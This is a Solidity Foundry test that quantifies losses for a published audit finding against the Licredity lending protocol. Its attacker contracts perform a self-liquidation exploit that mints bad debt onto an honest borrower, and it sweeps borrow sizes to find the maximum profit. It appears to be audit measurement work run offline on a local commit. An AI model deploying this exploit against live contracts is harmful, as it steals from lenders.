// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// Loss measurement for finding 62347 (Cyfrin, Licredity v2.0):
// "Proxy-based self-liquidation creates bad debt for lenders".
//
// Scenario (same sizes as the published PoC):
//   - An honest borrower (the victim) deposits 10 TOKEN (oracle price 1, margin rate 10%)
//     and borrows 9 DETH of debt token.
//   - The attacker deposits 0.5 TOKEN, then inside one unlock() borrows 1 DETH,
//     seizes its own underwater position through a helper contract, takes the
//     2x-deficit top-up out of the position, repays all of its debt and withdraws
//     its collateral. The attacker ends with an empty position.
// The top-up is minted out of nothing and added to the total debt balance, so it
// is paid by every other holder of debt shares. Here that is the victim.
//
// Every amount is printed in wei of DETH (1e18 = 1 DETH). TOKEN and DETH are both
// priced at 1 by the oracle mock, so the two can be added.
// Runs offline only, against the local audited commit e8ae10a.

import {Licredity} from "src/Licredity.sol";
import {Fungible} from "src/types/Fungible.sol";
import {Deployers} from "./utils/Deployer.sol";
import {StateLibrary} from "./utils/StateLibrary.sol";
import {ShareMath} from "./utils/ShareMath.sol";
import {BaseERC20Mock} from "test/mocks/BaseERC20Mock.sol";
import {console} from "@forge-std/console.sol";

contract Loss62347_Licredity is Deployers {
    using StateLibrary for Licredity;
    using ShareMath for uint128;

    BaseERC20Mock public token;
    uint256 victimId;
    uint256 victimShares;

    uint256 constant VICTIM_COLLATERAL = 10 ether;
    uint128 constant VICTIM_BORROW = 9 ether;

    function setUp() public {
        deployETHLicredityWithUniswapV4();
        deployAndSetOracleMock();
        deployLicredityRouter();
        token = _newAsset(18);
        oracleMock.setFungibleConfig(Fungible.wrap(address(token)), 1 ether, 100_000); // price 1, 10% margin

        victimId = licredityRouter.open();
        token.mint(address(this), VICTIM_COLLATERAL);
        token.approve(address(licredityRouter), VICTIM_COLLATERAL);
        licredityRouter.depositFungible(victimId, Fungible.wrap(address(token)), VICTIM_COLLATERAL);
        (uint256 totalShares, uint256 totalAssets) = licredity.getTotalDebt();
        victimShares = VICTIM_BORROW.toShares(totalAssets, totalShares);
        licredityRouterHelper.addDebt(victimId, victimShares, address(1));
    }

    function _victimDebt() internal view returns (uint256) {
        (uint256 totalShares, uint256 totalAssets) = licredity.getTotalDebt();
        return (victimShares * totalAssets + totalShares - 1) / totalShares; // same rounding as the contract
    }

    // Runs one attack. Returns 0 profit if the attack reverts.
    function _attack(uint256 collateral, uint256 borrow, bool verbose) internal returns (bool ok, uint256 profit) {
        AttackerSeizer seizer = new AttackerSeizer(licredity);
        AttackerRouter attacker = new AttackerRouter(licredity, token, seizer);
        uint256 victimDebtBefore = _victimDebt();

        try attacker.attack(collateral, borrow) returns (uint256 topup) {
            ok = true;
            uint256 endValue = licredity.balanceOf(address(attacker)) + token.balanceOf(address(attacker));
            profit = endValue - collateral;
            if (verbose) {
                uint256 victimDebtAfter = _victimDebt();
                uint256 victimLoss = victimDebtAfter - victimDebtBefore;
                console.log("attacker collateral put in (TOKEN wei)        ", collateral);
                console.log("attacker borrowed (DETH wei)                  ", borrow);
                console.log("top-up minted at seize = bad debt (DETH wei)  ", topup);
                console.log("attacker TOKEN back                           ", token.balanceOf(address(attacker)));
                console.log("attacker DETH kept after repaying all debt    ", licredity.balanceOf(address(attacker)));
                console.log("ATTACKER PROFIT (DETH wei)                    ", profit);
                console.log("victim collateral (TOKEN wei)                 ", VICTIM_COLLATERAL);
                console.log("victim debt before (DETH wei)                 ", victimDebtBefore);
                console.log("victim debt after (DETH wei)                  ", victimDebtAfter);
                console.log("VICTIM LOSS = debt increase (DETH wei)        ", victimLoss);
                console.log("victim equity before (wei)                    ", VICTIM_COLLATERAL - victimDebtBefore);
                console.log("victim equity after (wei)                     ", VICTIM_COLLATERAL - victimDebtAfter);
                console.log("loss, bps of victim collateral                ", victimLoss * 10_000 / VICTIM_COLLATERAL);
                console.log("loss, bps of victim debt before               ", victimLoss * 10_000 / victimDebtBefore);
                console.log(
                    "loss, bps of victim equity before             ",
                    victimLoss * 10_000 / (VICTIM_COLLATERAL - victimDebtBefore)
                );
            }
        } catch (bytes memory reason) {
            if (verbose) {
                console.log("ATTACK REVERTED, attacker profit = 0, victim loss = 0. Revert selector:");
                console.logBytes(reason);
            }
        }
    }

    /// PoC sizes: attacker 0.5 TOKEN collateral, borrows 1 DETH.
    function test_loss_pocSizes() public {
        (bool ok,) = _attack(0.5 ether, 1 ether, true);
        if (!ok) return;

        // Health rule from Licredity._appraisePosition, with the oracle mock config (price 1, 10% margin).
        uint256 debt = _victimDebt();
        uint256 margin = VICTIM_COLLATERAL / 10;
        bool healthy = VICTIM_COLLATERAL >= debt + margin && debt <= VICTIM_COLLATERAL - VICTIM_COLLATERAL / 100;
        console.log("victim position still healthy after the attack (false = now open to seizure):", healthy);
    }

    /// Larger borrows with the same 0.5 TOKEN collateral. Each try starts from the same state.
    /// The attacker repays inside the same unlock, so its position never has to be healthy after
    /// the seize. Profit = top-up x (victim share of total debt), which tends to 2 x victim debt.
    function test_loss_sweepBorrowSize() public {
        // the test deployer sets debtLimit = 10_000 DETH, so 9_000 is near the largest allowed borrow
        uint256[9] memory borrows =
            [uint256(1 ether), 2 ether, 4 ether, 8 ether, 9 ether, 20 ether, 100 ether, 1000 ether, 9000 ether];
        uint256 best;
        uint256 bestBorrow;
        for (uint256 i = 0; i < borrows.length; ++i) {
            uint256 snap = vm.snapshotState();
            uint256 debtBefore = _victimDebt();
            (bool ok, uint256 profit) = _attack(0.5 ether, borrows[i], false);
            uint256 victimLoss = ok ? _victimDebt() - debtBefore : 0;
            console.log("borrow (DETH wei) / succeeded:", borrows[i], ok);
            console.log("   attacker profit / victim loss (DETH wei):", profit, victimLoss);
            if (profit > best) {
                best = profit;
                bestBorrow = borrows[i];
            }
            vm.revertToState(snap);
        }
        console.log("BEST one-shot profit (DETH wei) at borrow:", best, bestBorrow);
        console.log("best profit, bps of victim collateral:", best * 10_000 / VICTIM_COLLATERAL);
        console.log("best profit, bps of victim debt:", best * 10_000 / VICTIM_BORROW);
    }
}

contract AttackerRouter {
    using StateLibrary for Licredity;
    using ShareMath for uint128;

    Licredity public licredity;
    BaseERC20Mock public token;
    AttackerSeizer public seizer;
    uint256 internal topup;

    constructor(Licredity _licredity, BaseERC20Mock _token, AttackerSeizer _seizer) {
        licredity = _licredity;
        token = _token;
        seizer = _seizer;
    }

    function attack(uint256 collateral, uint256 borrow) external returns (uint256) {
        uint256 positionId = licredity.open();
        licredity.stageFungible(Fungible.wrap(address(token)));
        token.mint(address(licredity), collateral);
        licredity.depositFungible(positionId);

        licredity.unlock(abi.encode(positionId, collateral, borrow));
        return topup;
    }

    function unlockCallback(bytes calldata data) public returns (bytes memory) {
        (uint256 positionId, uint256 collateral, uint256 borrow) = abi.decode(data, (uint256, uint256, uint256));

        // borrow so that the position is underwater
        (uint256 totalShares, uint256 totalAssets) = licredity.getTotalDebt();
        uint256 shares = uint128(borrow).toShares(totalAssets, totalShares);
        licredity.increaseDebtShare(positionId, shares, address(this));

        // self-liquidate through the helper; the position receives a 2x-deficit top-up of DETH
        seizer.seize(positionId);
        topup = licredity.getPositionFungiblesBalance(positionId, address(licredity));

        // cash out: take the top-up, repay all debt, take the collateral back
        licredity.withdrawFungible(positionId, address(this), Fungible.wrap(address(licredity)), topup);
        licredity.decreaseDebtShare(positionId, shares, false);
        licredity.withdrawFungible(positionId, address(this), Fungible.wrap(address(token)), collateral);
        return new bytes(0);
    }
}

contract AttackerSeizer {
    Licredity public licredity;

    constructor(Licredity _licredity) {
        licredity = _licredity;
    }

    function seize(uint256 positionId) external {
        licredity.seize(positionId, msg.sender);
    }
}
